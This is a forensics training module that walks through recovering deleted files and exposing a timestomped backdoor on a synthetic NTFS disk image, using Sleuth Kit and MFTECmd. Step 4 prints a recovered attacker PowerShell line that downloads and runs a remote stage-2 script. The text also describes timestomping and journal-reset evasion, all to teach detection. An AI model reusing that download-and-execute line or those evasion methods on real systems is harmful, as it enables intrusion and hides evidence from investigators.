# Module 15 — Filesystem Forensics & Super-Timelines: The Sleuth Kit + MFTECmd

**Deck mapping:** *Intrusion Hunting Playbook* → "Disk forensics & the super-timeline" (the filesystem spine under every other artifact).
**Goal:** open a raw disk image with **no Windows and no mounting**, read its partition table, list every file *including deleted ones*, **recover** a deleted file, **inspect one file's metadata** down to its two separate timestamp sets, **parse the `$MFT`** with MFTECmd, and **build a filesystem timeline** — then read that timeline to catch an attacker who deleted his tools and **timestomped** his backdoor.

> **Evidence note.** The disk image is **synthetic** (built for this lesson), but it is deliberately stamped with the **same ground-truth names as the real Case-001 host** so it dovetails with Modules 1-4 — and because the tool output below is the real parse of those exact bytes, those names are shown **unaltered**: host `DESKTOP-SDN1RPT`, user `mortysmith`, backdoor `coreupdater.exe`.

---

## 1. Background — why this matters

Every other module in this lab reads an artifact that Windows *chose* to write down: a Prefetch file, a registry value, an event-log record. This module goes **under** all of that, to the disk itself. When you have a forensic image of a machine, the filesystem is the **ground truth**: it knows about files that were **deleted**, files that were **renamed**, and the **exact timestamps** on everything — including timestamps an attacker tried to fake. Disk forensics answers the questions that anchor an entire investigation: *what was on this machine, when did it get there, what got deleted, and is any of the time evidence a lie?*

### What an investigator gets from the disk that they get nowhere else
- **Deleted files.** When you delete a file, Windows does not scrub the bytes — it just marks the file's record and its clusters "free." Until something reuses them, the file is still there. Disk tools read the record directly and pull the bytes back.
- **Two sets of timestamps.** NTFS stores **two** copies of each file's Modified/Accessed/Created/Changed times (explained below). Comparing them is the single most reliable way to catch **timestomping** (an attacker backdating a file to hide it).
- **A complete, sortable timeline.** Every file carries times; dump them all, sort by time, and you get a minute-by-minute **filesystem timeline** of the machine's history.

### How a disk image is laid out (the three layers you'll walk through)
A raw disk image (a `.dd`/`.raw`/`.E01` made by an imager like FTK Imager or `dd`) is a byte-for-byte copy of a physical disk. Reading it goes top-down through layers, and each Sleuth Kit tool lives at one layer:

1. **The partition table (volume layer).** The very start of the disk holds a small table (MBR or GPT) listing the **partitions** and **where each one starts** (as a sector number). Tool: **`mmls`**.
2. **The filesystem (filesystem layer).** Inside a partition is a filesystem — on Windows, **NTFS**. Tools: **`fsstat`** (its parameters), **`fls`** (its file list).
3. **The file's record + content (metadata & data layers).** NTFS describes every file with one record in a master table called the **`$MFT`**. Tools: **`istat`** (read one record), **`icat`** (read the file's bytes).

### NTFS, the `$MFT`, and the two timestamp sets (the crux of this module)
NTFS keeps its own bookkeeping in hidden files whose names start with `$`. The most important is the **`$MFT` (Master File Table)** — an array of ~1 KB **records**, one per file or directory. The record number *is* the file's id (TSK calls it the "inode" or "MFT entry"; entry 0 is the `$MFT` itself). Each record is built from **attributes**, and two of them carry timestamps:

- **`$STANDARD_INFORMATION` (`$SI`, attribute type `0x10`)** — holds the four **MACB** times Explorer shows (Modified, Accessed, Changed/MFT-modified, Born/Created). Crucially, a normal user-mode program **can change all four** via the documented Windows `SetFileTime` API. This is what timestomping tools rewrite.
- **`$FILE_NAME` (`$FN`, attribute type `0x30`)** — a *second* MACB set, stored alongside the file's name. These are written **only by the NTFS kernel driver** on create/rename/move and are **not reachable by the standard Win32 file-time APIs at all** — so the ordinary timestomping tools that call `SetFileTime` rewrite `$SI` but leave `$FN` untouched.

> **The timestomp tell:** at real file creation, NTFS writes `$SI` and `$FN` together, so they match. A timestomping tool rewrites only `$SI` (backdating it to look old) and **cannot reach `$FN`** through standard APIs — so afterwards **`$SI` Born is *earlier* than `$FN` Born** (an ordering that never happens naturally). A second tell: many stomping tools only set **whole seconds**, leaving `$SI` times ending in `.0000000` while `$FN` keeps its 100-nanosecond precision. And a third, *independent* artifact seals it: the **`$UsnJrnl` change journal** logs a **`USN_REASON_BASIC_INFO_CHANGE`** record the moment `$SI` is rewritten, so the stomp leaves a journal entry whose own timestamp converges on the **real** tamper moment even though `$SI` now claims 2019. Sound timestomp detection is **multi-artifact convergence** — `$SI`-vs-`$FN`, zeroed sub-seconds, and `$UsnJrnl` all pointing at the same instant — never a single tell. You will see the first two, in real tool output, below.

### NTFS internals reference — the attributes and journals an examiner reads

The two timestamp attributes above are the crux of *this* module, but they sit inside a larger structure worth knowing end-to-end, because the same `$MFT`, indexes, and journals recur across the filesystem, timeline, and anti-forensics work. This reference expands the picture; every fact here is what the tools already on your `PATH` (`istat`, `icat`, `fls`, `mactime`, MFTECmd) surface for you.

#### The MFT is a sequential array of records, and the first ones are the filesystem itself
The `$MFT` is one hidden file laid out as a flat array of fixed-size **records** (1,024 bytes on virtually every volume; the size is declared in `$Boot`, not hard-coded). Records are numbered from **0**, and that number *is* the file id (`istat image 5` reads record 5). The low records are NTFS's own metadata files — high-value artifacts in their own right:

| Entry | File | What it is |
|------|------|-----------|
| 0 | `$MFT` | the table itself; its `$DATA` maps where the MFT lives on disk |
| 1 | `$MFTMirr` | mirror of the first records, kept mid-volume for recovery |
| 2 | `$LogFile` | the metadata transaction journal (redo/undo) |
| 3 | `$Volume` | volume serial, NTFS version, dirty flag |
| 4 | `$AttrDef` | the attribute-type definitions this volume supports |
| 5 | `.` | the root directory |
| 6 | `$Bitmap` | cluster allocation map (used vs. free) |
| 7 | `$Boot` | boot sector + BIOS parameter block (record/cluster sizes live here) |
| 8 | `$BadClus` | clusters marked bad |
| 9 | `$Secure` | central, de-duplicated store of all security descriptors (ACLs/SIDs) |
| 10 | `$UpCase` | uppercase table for case-insensitive name collation |
| 11 | `$Extend` | directory holding `$UsnJrnl`, `$Quota`, `$ObjId`, `$Reparse` |

Entries 12–23 are reserved. Note that the change journal (`$UsnJrnl`) is a **child of `$Extend`**, so it takes a *high* entry number, not a fixed low one — which is why you locate `$UsnJrnl:$J` through `$Extend`, never at a constant inode.

#### A record = a header + a sequence of typed attributes
In NTFS a file's name, its timestamps, its security, and its content are *all just attributes* on the record. Each attribute is self-describing (type code, length, a resident/non-resident flag, optional name). The ones you meet most:

| Hex | Attribute | Purpose |
|-----|-----------|---------|
| `0x10` | `$STANDARD_INFORMATION` | the MACB set Explorer shows; DOS flags; owner/security id; USN |
| `0x20` | `$ATTRIBUTE_LIST` | pointer to attributes that spilled into other records |
| `0x30` | `$FILE_NAME` | filename + parent-directory reference + a *second* MACB set |
| `0x40` | `$OBJECT_ID` | unique 64-bit / GUID object id |
| `0x50` | `$SECURITY_DESCRIPTOR` | ACLs/SIDs (largely superseded by the central `$Secure`) |
| `0x80` | `$DATA` | file content |
| `0x90` | `$INDEX_ROOT` | root of a directory B-tree (always resident) |
| `0xA0` | `$INDEX_ALLOCATION` | non-resident index storage for large directories |
| `0xB0` | `$BITMAP` | allocation bitmap (for the MFT itself and large indexes) |

**Resident vs. non-resident:** an attribute value is either stored *inline* in the 1 KB record (resident) or out in clusters on disk with the record holding only compact **data runs** — `(length, starting-cluster)` extents — that a tool follows to reassemble it (non-resident). `$STANDARD_INFORMATION` and `$FILE_NAME` are always resident; `$DATA` can be either.

#### The record header (what `istat` interprets for you)
- **Signature** — first four bytes are ASCII `FILE` (a failed integrity check reads `BAAD`).
- **Fixup / Update-Sequence Array** — a torn-write detector: the last two bytes of every 512-byte sector are swapped out for a repeating sequence number and stashed in an array; a parser must apply the fixup before trusting the record. (This is why you carve `$MFT` with a forensic tool, not `dd`-and-hope.)
- **`$LogFile` Sequence Number (LSN)** — ties the record to its last `$LogFile` transaction.
- **Sequence number** — bumped each time a record is *reused* for a new file; combined with the entry number it forms a **file reference** that lets NTFS detect stale pointers to a recycled entry.
- **Hard-link count** — counts the `$FILE_NAME` attributes on the record.
- **Flags** — `0x01` = in use, `0x02` = directory. So `0x00` = deleted file, `0x01` = live file, `0x02` = deleted directory, `0x03` = live directory. This is how tools decide "deleted?" and "file or folder?".
- **Base record reference** — for spillover records, points back to the base entry.

#### `$STANDARD_INFORMATION` (`0x10`) and `$FILE_NAME` (`0x30`)
Covered in depth above as the timestomp pair. In one line each: `$SI` carries the Explorer-visible MACB set and is **user-mode settable** (`SetFileTime` → the timestomp target); `$FN` carries a **second** MACB set plus the name and parent reference, is **kernel-written on create/rename/move**, and so exposes the stomp when `$SI` and `$FN` disagree in an impossible way. A file can hold **several `$FILE_NAME` attributes** (Win32 long name, DOS 8.3 short name, POSIX), which is why the link count tracks them.

> **The limit of the tell — full-stomp tools.** The `$SI`-vs-`$FN` test works because *ordinary* tools reach only `$SI`, but it is not unbreakable: advanced utilities such as **SetMace** can forge `$FN` too — either by driving the file through a rename/move so the kernel re-copies the (already-faked) `$SI` times into `$FN`, or by writing the attribute directly — and they restore 100-nanosecond precision, so `uSecZeros` comes up clean too. A file "full-stomped" this way shows **`$SI` == `$FN` to the nanosecond**, indistinguishable at the record level from a genuinely old file — which is exactly why a single-record heuristic is *necessary but never sufficient*. The forgery cannot be made consistent everywhere at once: the move-trick and metadata rewrites still generate `$LogFile` and `$UsnJrnl` activity (a `BASIC_INFO_CHANGE`, or the rename pair, in the incident window), and a **fourth** timestamp copy lives in the parent directory's `$I30` index entry — so a stomp that misses any one of those betrays itself. Treat matching `$SI`/`$FN` as passing *one* check, not clearing the file. (SetMace; Palmbach & Breitinger, DFRWS EU 2020.)

#### `$DATA` (`0x80`) — content, resident data, and Alternate Data Streams
Every ordinary file has one unnamed `$DATA` stream. Small files are **resident** — the content sits inside the MFT record with *no clusters allocated*, so a small deleted file can be recovered straight from the `$MFT` even if its clusters were reused. Larger files are **non-resident** (data runs; this is the map `icat` walks).

NTFS also allows **extra, named `$DATA` attributes** — **Alternate Data Streams (ADS)**, addressed `file.txt:streamname`. ADS content is invisible to Explorer and excluded from the displayed file size, historically abused to hide payloads. The headline forensic case is **`Zone.Identifier`**, the **Mark-of-the-Web (MotW)**: browsers and mail clients attach it to downloaded files. Its `ZoneId` (0 = local machine, 1 = intranet, 2 = trusted, **3 = internet**, 4 = restricted) marks provenance, and modern browsers add `ReferrerUrl`/`HostUrl` lines that can reveal the **exact download URL** — powerful for a suspicious binary. Reason both ways: presence (especially `ZoneId=3` with a `HostUrl`) is strong evidence of download and source; absence is *consistent with* local creation, copy from removable/network media, or an archive/copy step that stripped the stream — suggestive, never conclusive. `istat` shows each `$DATA` (default and named) and whether it's resident; `icat` extracts a named stream; MFTECmd lists named streams and, via `$J`, flags `STREAM_CHANGE` events.

#### `$I30` — directory indexes and INDX slack (deleted-file recovery)
A directory's contents are not a flat list but a **B-tree of `$FILE_NAME` entries sorted by name**, built from `$INDEX_ROOT` (`0x90`, resident root) and, once the directory outgrows the root, `$INDEX_ALLOCATION` (`0xA0`, non-resident nodes). The index name for filename indexes is **`$I30`**; the non-resident nodes are 4,096-byte records that begin with the ASCII signature **`INDX`**. Each index entry is a *copy* of a child's `$FILE_NAME` — so it carries the name, sizes, the full `$FN` MACB set, and both the file and parent MFT references.

The forensic gold is **INDX slack**: when a file is deleted or renamed the B-tree re-balances but does **not** zero the old entry, so a stale `$FILE_NAME` survives in the unused slack of the index node until overwritten. You can therefore recover a deleted file's name, size, timestamps, and MFT/parent references **from the parent directory's index even after the file's own MFT record is reused** — an independent recovery path that also gives a second, `$FN`-sourced timestamp snapshot to check a stomped `$SI` against. Tools: MFTECmd (processes `$I30`/directory slack), INDXParse.py, INDXRipper.

#### `$LogFile` (record 2) and `$UsnJrnl:$J` (under `$Extend`)
Two journals, at two different levels:

- **`$LogFile`** is the low-level **metadata transaction log**. Before NTFS commits a metadata change it writes a transaction with an **LSN**, a **redo** (roll forward) and an **undo** (roll back), and the target's file reference; on reboot it replays/rolls back to a consistent state. Because it operates at the bottom, one logical action ("create a file") becomes *several* `$LogFile` transactions touching `$MFT`, `$I30`, `$Bitmap`. It is **circular and small**, so it **wraps fast** — its window is minutes-to-hours on a busy volume — but while in-window it is the finest-grained, most authoritative reconstruction of very recent creates/deletes/renames. Tool: LogFileParser (Joakim Schicht), NTFS Log Tracker.

- **`$UsnJrnl:$J`** (the `$J` alternate data stream of `$Extend\$UsnJrnl`; a **sparse** file whose aged-out front reads as zeros) is the higher-level **change journal** — one record per change, each carrying a **USN**, a UTC timestamp, the file and **parent** references (path reconstruction), a **name**, and a bitwise **reason** set. Key reasons: `FILE_CREATE` (0x100), `FILE_DELETE` (0x200), `RENAME_OLD_NAME` (0x1000) + `RENAME_NEW_NAME` (0x2000) — a rename emits **both** — `DATA_OVERWRITE`/`_EXTEND`/`_TRUNCATION`, `BASIC_INFO_CHANGE` (0x8000, i.e. a timestamp/attribute change — the timestomp corroborator), `STREAM_CHANGE` (0x200000, an ADS added/removed), and `CLOSE` (0x80000000). Reasons **accumulate** over an open handle and finish with a `CLOSE`. It logs at a higher level, so it covers a **much longer window than `$LogFile`** — typically **days** (volume-dependent; teach "days," not a constant), and records **survive the file's deletion**. Tools: **MFTECmd `-f $J`**, UsnJrnl2Csv, Velociraptor `parse_usn()`.

**Reading the three together** is the super-timeline pivot: the `$MFT` gives current state + both timestamp sets (*what exists, does `$SI` disagree with `$FN`?*); `$UsnJrnl` gives the durable long-baseline narrative (*what was created / renamed / deleted, and when — even if it's gone now*); `$LogFile`, when in-window, gives high-resolution ground truth for the most recent events (*the exact operation and order behind a USN summary*). `$SI` can be forged, but the `$FN` set, the USN `FILE_*`/`BASIC_INFO_CHANGE` records, and the `$LogFile` transactions are far harder to forge *consistently* — which is what defeats anti-forensics.

> **Older journal and `$MFT` states — mine the shadow copies.** Because `$LogFile` wraps in minutes-to-hours and `$UsnJrnl` in days, the state you need may already have aged out of the live volume — but a **Volume Shadow Copy** taken before the attacker's dwell time still holds an *earlier* `$MFT`, `$LogFile`, and `$UsnJrnl:$J`. Mounting each snapshot (e.g. libvshadow's `vshadowmount`) and **diffing** the same metadata files across snapshots recovers a file's timestamps *before* a stomp, resurfaces a journal window that has since wrapped, and — critically — exposes a journal that was **reset or truncated** on the live volume, since the pre-reset copy survives in the snapshot. Shadow deletion clustered around a burst of `$UsnJrnl` writes is itself an anti-recovery tell — so treat VSS as a first-class *source* of historical baseline, not just a defensive control.

#### Useful techniques for searching journals
- **Pivot on reason flags.** Filter the parsed `$J` CSV to `FILE_DELETE` to enumerate everything deleted in the window (with names/timestamps that survive the file); to `FILE_CREATE` to catch dropped tooling; to `RENAME_OLD_NAME`+`RENAME_NEW_NAME` pairs (same USN-adjacent) to see staging where an attacker renames a payload into place.
- **Reconstruct paths** by chaining each record's **parent reference** up through the `$MFT` — the journal stores references, not full paths, so join `$J` against the `$MFT` output on the parent entry. (MFTECmd can perform this join for you: pass `-m <path-to-$MFT>` alongside `-f <$J>` and it resolves each USN record's parent reference against the `$MFT`, writing the full path straight into the CSV — the walkthrough command omits `-m` on purpose so you see the manual chain the switch automates.)
- **Bracket by time**, not by reading it all: once `istat`/MFTECmd hand you the incident window, filter both journals to it (the same windowing you use with `mactime` below).
- **Corroborate timestomping**: a `BASIC_INFO_CHANGE` in `$J` whose *own* timestamp lands in the incident window, on a file whose `$SI` claims to be years old, converges on the real tamper moment.
- **Watch for the gap**: a stretch of `$J` that is suspiciously empty, or a `$LogFile`/`$UsnJrnl` that was reset, is itself an indicator (see file-wiping and countermeasures below).

#### Characteristics of file wiping (secure deletion)
Ordinary deletion only flips the record's in-use flag and frees clusters — the `$MFT` entry, `$FN` in the parent `$I30`, and the `$UsnJrnl` `FILE_DELETE` record all persist, which is why recovery works. A **wiping** tool tries to destroy that residue, and the *attempt itself* leaves a recognizable signature:
- **Overwritten cluster content** — carved/recovered data comes back as uniform patterns (all-zero, all-`0xFF`, or repeating/random fill) instead of a real header, so a file "exists" in metadata but its content is meaningless.
- **Normalized/zeroed timestamps** and mass same-second `$SI` values across many files (a wipe pass rewriting metadata in bulk).
- **A burst of `$UsnJrnl` `DATA_OVERWRITE` then `FILE_DELETE`** across many files in a tight interval — the journal captures the wipe even when the files are gone.
- **Tool footprints** — the wiping utility's own presence in prefetch, `$MFT`, `$UsnJrnl` `FILE_CREATE`, and MotW (`Zone.Identifier`) on the downloaded wiper.
- **Journal truncation/reset** — a `$UsnJrnl` deleted and recreated (via `fsutil usn`) or a `$LogFile` that starts abruptly is a strong anti-forensics tell, because normal systems don't reset them.

#### Defensive countermeasures (making the evidence harder to erase)
- **Enable and size up the change journal** (`fsutil usn createjournal` with a generous `maxsize`) so the `$UsnJrnl` window covers days-to-weeks and survives an attacker's dwell time.
- **Ship the journals off-host early** — forward `$UsnJrnl`/Security/Sysmon telemetry to a SIEM or EDR so a local wipe can't reach the copy (this is exactly why the enterprise-collection modules exist).
- **Enable Sysmon** (Event ID 11 FileCreate, 23/26 FileDelete) and **object-access auditing** so file lifecycle is recorded *outside* NTFS where wiping can't touch it.
- **Volume Shadow Copies / periodic imaging** capture point-in-time `$MFT`/journal state before an attacker can scrub it.
- **Triage fast** — `$LogFile`'s minutes-to-hours window means the richest evidence is perishable; collect the volume (or at least `$MFT`, `$LogFile`, `$UsnJrnl:$J`) as early in the response as possible.

> **How this maps to the practice below.** Everything above is what `istat`, `icat`, `fls`, `mactime`, and MFTECmd expose from the shipped image — you already parse the `$MFT` with MFTECmd in Step 6 and read both timestamp sets with `istat` in Step 5. The `$UsnJrnl` gets its own hands-on MFTECmd walkthrough in the browser/journal exercises; the `$I30`, `$LogFile`, and journal-search techniques here give you the vocabulary to read those outputs like an examiner rather than a tool operator.

### What the two tools in this module do
- **The Sleuth Kit (TSK)** — Brian Carrier's open-source disk-forensics toolkit (the engine under Autopsy). A family of small command-line tools (`mmls`, `fls`, `istat`, `icat`, `mactime`, …), each working at one layer above. Reads images **read-only and offline** — it never mounts anything, so the evidence can't change. Version on the lab VM: **4.11.1**.
- **MFTECmd** — Eric Zimmerman's dedicated `$MFT`/`$J`/`$LogFile` parser (.NET). It flattens the `$MFT` into a rich CSV with **both** timestamp sets in separate columns *and* pre-computed timestomp flags (`SI<FN`, `uSecZeros`). Version on the lab VM: **2026.5.0**.

> **Plain-language summary:** TSK lets you read a disk image like a forensic surgeon — partitions, every file (even deleted), exact metadata, raw bytes. MFTECmd turns the NTFS master table into a spreadsheet that flags faked timestamps for you. Together they give you the **filesystem timeline** that the rest of the investigation hangs on.

---

## 2. The scenario in this module's data

You are handed a disk image, **`disk-DESKTOP-SDN1RPT.raw`**, pulled from the desktop of user **`mortysmith`** — the patient-zero host from the lab's running "Stolen Szechuan Sauce" narrative (Modules 1-4). It is a small, **synthetic** NTFS image built specifically for this lesson (see [`data/README.md`](data/README.md) for full provenance, licence, and the generator script — *knowing what your evidence is, is itself a DFIR skill*). It was constructed so the filesystem-level facts are exact and checkable:

| What's on disk | Where | The point |
|---|---|---|
| `coreupdater.exe` — a C2 backdoor | `Windows/Temp/` | **Timestomped** to look like a 2019 OS file. You'll prove it. |
| `win32k.sys` — a real old OS driver | `Windows/System32/` | Genuinely old (2019) and *consistent*. The **control** — old is not the same as faked. |
| `update.ps1` — a stage-2 downloader | `…/AppData/Local/Temp/` | **Deleted** by the attacker. You'll recover it. |
| `loot.zip` — a ~13 KB exfil archive | `…/Downloads/` | **Deleted** by the attacker. You'll recover it from its clusters. |
| benign user/OS files | various | Baseline for comparison. |

The real intrusion happened on **2026-06-15, ~09:10–09:20 UTC**. Hold that window in mind — half the lesson is that the *disk* tells you this even though the attacker tried to hide it.

---

## 3. Setup

Open **Git Bash** on the lab VM and change into this module's data directory:

```bash
cd module-15-filesystem-timeline/data
```
- **`cd module-15-filesystem-timeline/data`** — move into the folder holding this module's disk image (`disk-DESKTOP-SDN1RPT.raw`) and the pre-carved `MFT`. **Every command below is run from inside this folder**, so the image and the reports you write use simple relative paths.
- The full **Sleuth Kit** (`mmls`, `fls`, `istat`, `icat`, `mactime`, …) and **MFTECmd** are installed **natively on the lab VM and already on your `PATH`** — call them directly by name in Git Bash; there is no container or Docker. The VM is kept **offline** (no network), so evidence can never "phone home." TSK reads the image **read-only** and never mounts it, so the evidence can't change.

> **Prefer a GUI?** The Sleuth Kit also ships with **Autopsy**, its graphical front-end, on the lab VM — same engine, same results, point-and-click. The command-line walkthrough below is faster to follow and to drop into a report; the flags map one-to-one.

---

## 4. Step-by-step walkthrough

### Step 1 — Read the partition table (`mmls`): where does the filesystem start?
You cannot point a filesystem tool at the *disk* — you must point it at the *partition* inside the disk. `mmls` reads the MBR/GPT table and tells you where each partition begins.

```bash
mmls disk-DESKTOP-SDN1RPT.raw
```
- The only argument is the image. (Add **`-t dos`**/**`-t gpt`** to force the table type, or **`-B`** to also print sizes in bytes; not needed here — `mmls` auto-detects.)

**Real output:**
```
DOS Partition Table
Offset Sector: 0
Units are in 512-byte sectors

      Slot      Start        End          Length       Description
000:  Meta      0000000000   0000000000   0000000001   Primary Table (#0)
001:  -------   0000000000   0000002047   0000002048   Unallocated
002:  000:000   0000002048   0000020479   0000018432   NTFS / exFAT (0x07)
```
**Read it:** there is one real partition — **NTFS, starting at sector 2048** (the standard 1 MiB alignment gap is the "Unallocated" row before it). **`2048` is the magic number for the rest of this module:** every filesystem tool needs it as **`-o 2048`** ("offset 2048 sectors"). Forget it and the tools read the wrong bytes and fail. (Units are 512-byte sectors, shown in the header.)

> *(Optional)* `fsstat -o 2048 disk-DESKTOP-SDN1RPT.raw` confirms the filesystem and prints NTFS details — volume name `OSDISK`, **1024-byte MFT entries**, MFT starting cluster, cluster size. Handy for sanity-checking, not required to proceed.

### Step 2 — List every file, including deleted ones (`fls`)
`fls` walks the directory tree and prints each name with its MFT entry number.

```bash
fls -o 2048 -r -p disk-DESKTOP-SDN1RPT.raw
```
- **`-o 2048`** — the **partition offset in sectors** from Step 1. (Almost every TSK filesystem command needs this.)
- **`-r`** — **recurse** into subdirectories (otherwise you only see the root).
- **`-p`** — print **full paths** (cleaner than the indented tree when recursing).

**Real output (trimmed to the interesting rows):**
```
d/d 68-144-2:	Users/mortysmith
-/r * 80-128-2:	Users/mortysmith/AppData/Local/Temp/update.ps1
r/r 78-128-2:	Users/mortysmith/Desktop/notes.txt
r/r 77-128-2:	Users/mortysmith/Documents/Q3_recipes.xlsx
-/r * 81-128-2:	Users/mortysmith/Downloads/loot.zip
r/r 76-128-2:	Windows/System32/cmd.exe
r/r 75-128-2:	Windows/System32/win32k.sys
r/r 79-128-2:	Windows/Temp/coreupdater.exe
```
**How to read a line** — take `-/r * 81-128-2:	…/loot.zip`:
- **`-/r`** — two file types: *name-type* / *metadata-type*. `r` = regular file, `d` = directory. A leading **`-`** means the name slot no longer points to live metadata — i.e. it's **deleted**.
- **`*`** — TSK's flag for a **deleted** entry. (There it is on `update.ps1` and `loot.zip`.)
- **`81`** — the **MFT entry number** (the file's id). You'll feed this to `istat`/`icat`.
- **`-128-2`** — the attribute id (`128` = `$DATA`); ignore for now.

So in one command you can see the benign baseline *and* the two files the attacker deleted (`update.ps1`, `loot.zip`) — still listed, because their MFT records haven't been reused.

### Step 3 — Show *only* the deleted entries (`fls -d`)
To make the deletions jump out, ask for only them:
```bash
fls -o 2048 -r -d -p disk-DESKTOP-SDN1RPT.raw
```
- **`-d`** — show **only deleted** entries (`-u` would show only undeleted).

**Real output:**
```
-/r * 80-128-2:	Users/mortysmith/AppData/Local/Temp/update.ps1
-/r * 81-128-2:	Users/mortysmith/Downloads/loot.zip
-/r * 16:	$OrphanFiles/OrphanFile-16
... (OrphanFile-17 … 23)
```
**Read it:** the two attacker artifacts are confirmed deleted. The `$OrphanFiles/OrphanFile-16…23` rows are **normal NTFS noise** — they are reserved `$MFT` metadata slots NTFS pre-creates, not real user files; ignore them. **Leads: entries `80` and `81`.**

### Step 4 — Recover the deleted files (`icat`)
`icat` streams a file's raw bytes by MFT entry — and it works on **deleted** files whose clusters are still intact.

```bash
icat -o 2048 -r disk-DESKTOP-SDN1RPT.raw 80
icat -o 2048 -r disk-DESKTOP-SDN1RPT.raw 81 > recovered_loot.zip
```
- **`-o 2048`** — partition offset (as always).
- **`-r`** — attempt **recovery** of a deleted file (follow the record's cluster list even though it's marked free).
- **`80` / `81`** — the MFT entry numbers from Step 3.
- Redirect (`>`) the bytes to a file to save them; without redirection they print to the terminal.

**Real output — entry 80 (`update.ps1`) printed straight to screen:**
```
IEX (New-Object Net.WebClient).DownloadString('http://45.77.13.37/c2.ps1')  # stage-2 loader
```
There's the smoking gun: a deleted **PowerShell downloader** that pulls stage-2 from `45.77.13.37`. **Recovered from a file the attacker thought he'd erased.**

**Real output — entry 81 (`loot.zip`) recovered to a file:**
```
$ icat -o 2048 -r disk-DESKTOP-SDN1RPT.raw 81 | head -3
PKSTOLEN: szechuan sauce formula row 001 ,sweet,umami,secret
STOLEN: szechuan sauce formula row 002 ,sweet,umami,secret
STOLEN: szechuan sauce formula row 003 ,sweet,umami,secret
$ icat -o 2048 -r disk-DESKTOP-SDN1RPT.raw 81 | wc -c
12984
```
The `PK` magic bytes confirm it's a ZIP, and the recovered **12,984 bytes** are the staged stolen data. Because this file was **non-resident** (bigger than one cluster), `icat` carved it back from its data clusters — exactly what you'd do to a deleted malware binary before hashing it or running it through `capa`/`FLOSS`/YARA (the earlier malware-triage modules).

### Step 5 — Inspect one file's metadata and catch the timestomp (`istat`)
`istat` dumps everything in a single MFT record — allocation status, size, the cluster list, and **both** timestamp sets. This is where timestomping is exposed.

```bash
istat -o 2048 disk-DESKTOP-SDN1RPT.raw 79
```
- **`79`** — the MFT entry for `Windows/Temp/coreupdater.exe` (from Step 2).

**Real output:**
```
$STANDARD_INFORMATION Attribute Values:
Created:	2019-03-15 12:00:00.000000000 (UTC)
File Modified:	2019-03-15 12:00:00.000000000 (UTC)
MFT Modified:	2026-06-29 19:08:09.267375500 (UTC)
Accessed:	2019-03-15 12:00:00.000000000 (UTC)

$FILE_NAME Attribute Values:
Name: coreupdater.exe
Created:	2026-06-15 09:12:33.456789000 (UTC)
File Modified:	2026-06-15 09:12:33.456789000 (UTC)
MFT Modified:	2026-06-15 09:12:33.512004400 (UTC)
Accessed:	2026-06-15 09:12:34.001022200 (UTC)
```
**Read it — three independent tells, all in one record:**
1. **`$SI` Created (2019-03-15) is *earlier* than `$FN` Created (2026-06-15).** A real file has these set *together*. The only way they diverge like this is that something **rewrote `$SI`** after creation — **timestomping**. The attacker backdated the file ~7 years to bury it among genuine OS files.
2. **Sub-second precision is zeroed in `$SI`** (`12:00:00.000000000`) but **intact in `$FN`** (`09:12:33.456789000`). The stomping tool only set whole seconds; the kernel-written `$FN` kept its 100-ns precision.
3. **`$SI` MFT-Modified is 2026-06-29** — recent — while the other `$SI` times claim 2019. The "C-time" updates whenever the record changes and is awkward to backdate; here it betrays *when the stomp happened* (the day the image was built/collected).

Now compare against a file that is **legitimately** old — the real OS driver `win32k.sys` (entry 75):
```bash
istat -o 2048 disk-DESKTOP-SDN1RPT.raw 75
```
```
$STANDARD_INFORMATION Attribute Values:
Created:	2019-03-15 08:34:21.765432100 (UTC)
...
$FILE_NAME Attribute Values:
Created:	2019-03-15 08:34:21.765432100 (UTC)
```
**Read it:** here `$SI` Created **equals** `$FN` Created, **to the 100-nanosecond**, and both carry sub-second precision. This file is old *and consistent* — **not** stomped. That contrast is the whole skill: *"old" is not suspicious; "`$SI` older than `$FN`" is.*

### Step 6 — Parse the `$MFT` with MFTECmd (the timestomp flags, for free)
Doing the `$SI`-vs-`$FN` comparison by eye works for one file; across a whole `$MFT` you want it computed for you. MFTECmd does exactly that. First carve the `$MFT` out of the image (it's always MFT entry **0**):
```bash
icat -o 2048 disk-DESKTOP-SDN1RPT.raw 0 > MFT
```
*(The carved `MFT` is already shipped in `data/` so you can skip straight to parsing.)* Now parse it:
```bash
MFTECmd -f MFT --csv . --csvf mft.csv
```
- **`-f MFT`** — the metadata **f**ile to parse. MFTECmd **auto-detects** that it's a `$MFT` (it also accepts `$J`, `$LogFile`, `$Boot`, `$SDS`).
- **`--csv .`** — write CSV output into the current folder.
- **`--csvf mft.csv`** — name the output file (otherwise it's auto-timestamped).

**Real output:**
```
MFT: FILE records found: 35 (Free records: 47) File size: 82KB
	CSV output will be saved to ./mft.csv
```
Open `mft.csv` (Excel / LibreOffice / Timeline Explorer). The columns that matter here:
- **`Created0x10` / `Created0x30`** — `$SI` Created (`0x10`) vs `$FN` Created (`0x30`). (MFTECmd only fills `0x30` when it *differs* from `0x10`, so a populated `Created0x30` is itself a flag.)
- **`SI<FN`** — a pre-computed boolean: **True** when `$SI` Created is earlier than `$FN` Created (the timestomp condition).
- **`uSecZeros`** — **True** when `$SI` sub-seconds are all zero (the whole-second tell).
- **`InUse`** — False = the record is for a **deleted** file.

Filtering this module's `mft.csv` to the interesting files gives:
```
FileName          InUse   SI<FN   uSecZeros   Created0x10                   Created0x30
coreupdater.exe   True    True    True        2019-03-15 12:00:00.0000000   2026-06-15 09:12:33.4567890
win32k.sys        True    False   False       2019-03-15 08:34:21.7654321   (blank)
cmd.exe           True    False   False       2019-03-15 08:34:19.1234567   (blank)
Q3_recipes.xlsx   True    False   False       2026-05-20 14:02:11.7731002   (blank)
update.ps1        False   False   False       2026-06-15 09:10:05.3312044   (blank)
loot.zip          False   False   False       2026-06-15 09:20:15.8890231   (blank)
```
**Read it:** **`coreupdater.exe` is the only row with `SI<FN=True` and `uSecZeros=True`** — and the only one with a populated `Created0x30`. In Timeline Explorer you'd just sort/colour on those two columns and the stomped file rises to the top instantly. Note `update.ps1` and `loot.zip` show **`InUse=False`** — MFTECmd sees the deletions too, and their **real** `$SI` creation times (`09:10` and `09:20`) pin the intrusion window.

### Step 7 — Build the filesystem timeline (`fls -m` → `mactime`)
A timeline turns "a pile of files with times" into "a story in time order." The classic TSK pipeline is two steps: dump a **bodyfile** (every file's times in a pipe-delimited format), then sort it with **`mactime`**.

```bash
fls -o 2048 -r -m C: disk-DESKTOP-SDN1RPT.raw > fls.body
mactime -b fls.body -d -z UTC > timeline.csv
```
